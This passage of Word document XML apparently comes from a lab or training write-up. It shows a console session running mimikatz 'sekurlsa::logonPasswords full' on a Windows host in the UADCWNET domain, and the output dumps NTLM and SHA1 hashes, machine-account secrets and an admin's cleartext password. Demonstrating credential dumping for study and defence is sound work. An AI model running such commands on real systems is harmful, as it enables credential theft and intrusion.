          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B05A54">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AFA0B8" w14:textId="77777777" w:rsidR="00351C72" w:rsidRDefault="00351C72" w:rsidP="00351C72">
      <w:pPr>
        <w:ind w:right="919"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61B59F1D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">C:\&gt;mimikatz.exe </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA60783" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t>mimikatz.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7AD63F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="567A2ECA" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">  .#####.   mimikatz 2.2.0 (x64) #18362 Nov </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>25</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2019 02:50:28</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2861D79F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve"> .## ^ ##.  "A La Vie, A L'Amour" - (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>oe.eo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C99B93D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve"> ## / \ #</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>#  /</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40644821" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622FF433" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve"> '## v ##'       Vincent LE TOUX          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">   (</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> vincent.letoux@gmail.com )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B83D0A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0A93C9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="2FD42FC2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">mimikatz # </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>sekurlsa::</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>logonPasswords full</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A38DF9E" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="72E7AECD" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Authentication </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Id :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 0 ; 996 (00000000:000003e4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D29D8CC" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Session         </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Service from 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096EDA5C" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">User Name       </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SERVER2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBBC380" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Domain          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A47FBA9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Server    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (null)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468E6D78" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Time      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 12/16/2019 3:00:13 PM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610A5DB9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">SID             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> S-1-5-20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BA66D5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>msv :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B07F769" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> [00000003] Primary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAB3E8D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SERVER2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="338B8509" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7B6DA2" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * NTLM   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 2d01a086b1165cab51888b34b61505d4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C299EA4" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * SHA1   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> c27e51748458d01082785f842d63ab0ef74fd25f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B7DBA9" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>tspkg :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F72B351" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>wdigest :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E560ADC" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SERVER2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EB6AFE" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437480A5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Password : f8 89 a4 82 89 2a 62 47 7a 7e 06 7d a4 cb f4 0f 5c 07 c9 e5 af f5 31 1e 59 4c 80 0f a8 d1 d0 2b 51 1a 85 bd c4 4b 60 3b 20 fc 00 dd 7b 65 5e 64 23 70 01 b1 88 12 5c 7f 00 21 0f f3 ed 81 ec 31 ab 16 07 b9 68 0a c9 24 b0 08 a0 da bf 66 7d 82 a2 fc 39 f0 aa 6e 4c d6 3a a1 30 64 fc 33 7e 4e 52 60 26 9c 62 dc c7 84 b5 68 ff 35 c6 77 31 d2 bd 0a ab a5 0a 5c 77 92 48 06 81 5d 5f d3 f6 0c b3 d5 69 d0 0a ce 6d c8 3f 14 b1 73 93 13 54 5a 04 01 94 20 11 f8 af b9 84 f1 0d 06 6c 84 f3 51 78 d2 8d 9f 74 af c2 cc 49 72 96 04 94 03 ef bf f7 85 6e 8b e0 e0 66 47 92 c4 77 eb 1f b8 04 7b 81 da 75 a7 aa 5b 0d fa c4 af 6a a8 18 26 3e 96 54 8d ab 73 b7 79 0c 58 6b 05 07 41 be 32 55 b7 ef 4b be 64 e8 78 66 c9 68 e8 46 4e 7a d0 73 45 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677802C5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>kerberos :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="020F2EB0" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> server2$</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7ED7BA" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET.COM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C26C07A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Password : f8 89 a4 82 89 2a 62 47 7a 7e 06 7d a4 cb f4 0f 5c 07 c9 e5 af f5 31 1e 59 4c 80 0f a8 d1 d0 2b 51 1a 85 bd c4 4b 60 3b 20 fc 00 dd 7b 65 5e 64 23 70 01 b1 88 12 5c 7f 00 21 0f f3 ed 81 ec 31 ab 16 07 b9 68 0a c9 24 b0 08 a0 da bf 66 7d 82 a2 fc 39 f0 aa 6e 4c d6 3a a1 30 64 fc 33 7e 4e 52 60 26 9c 62 dc c7 84 b5 68 ff 35 c6 77 31 d2 bd 0a ab a5 0a 5c 77 92 48 06 81 5d 5f d3 f6 0c b3 d5 69 d0 0a ce 6d c8 3f 14 b1 73 93 13 54 5a 04 01 94 20 11 f8 af b9 84 f1 0d 06 6c 84 f3 51 78 d2 8d 9f 74 af c2 cc 49 72 96 04 94 03 ef bf f7 85 6e 8b e0 e0 66 47 92 c4 77 eb 1f b8 04 7b 81 da 75 a7 aa 5b 0d fa c4 af 6a a8 18 26 3e 96 54 8d ab 73 b7 79 0c 58 6b 05 07 41 be 32 55 b7 ef 4b be 64 e8 78 66 c9 68 e8 46 4e 7a d0 73 45 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B30B39" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>ssp :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C249C5" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>credman :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1894F006" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="24C8C769" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Authentication </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Id :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 0 ; 306213 (00000000:0004ac25)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4596C795" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Session         </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Interactive from 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4473810F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">User Name       </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2B05CD" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Domain          </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738A4BC8" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Server    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> SERVER2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8A2E58" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Logon Time      </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 12/16/2019 3:00:58 PM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F20B505" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">SID             </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> S-1-5-21-816344815-1091841032-1499945149-1000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44CD4C7E" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>msv :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FC6926" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> [00000003] Primary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="785A9571" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46240A8F" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB5E930" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * NTLM   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a492077fbcde819c130f5383f76d0e9c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BFBD17" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * SHA1   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 43105f69263daa7f752252646c5372d95746d60b</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C5EF80" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>tspkg :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3281DAAA" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAE8B71" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5528462A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Password :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Thisisverysecret2019</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0518AA7A" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>wdigest :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E50CF68" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D318E64" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1130625B" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Password :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Thisisverysecret2019</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0839F03D" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>kerberos :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C209F6" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Username :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C04E5E0" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * Domain </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> UADCWNET.COM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F3B577" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
        <w:t xml:space="preserve"> * </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Password :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Thisisverysecret2019</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A857012" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>ssp :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C293436" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>credman :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C4D502" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC"/>
    <w:p w14:paraId="712C7BF3" w14:textId="77777777" w:rsidR="002152BC" w:rsidRDefault="002152BC" w:rsidP="002152BC">
      <w:r>
        <w:t xml:space="preserve">Authentication </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>Id :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 0 ; 997 (00000000:000003e5)</w:t>
      </w:r>
    </w:p>
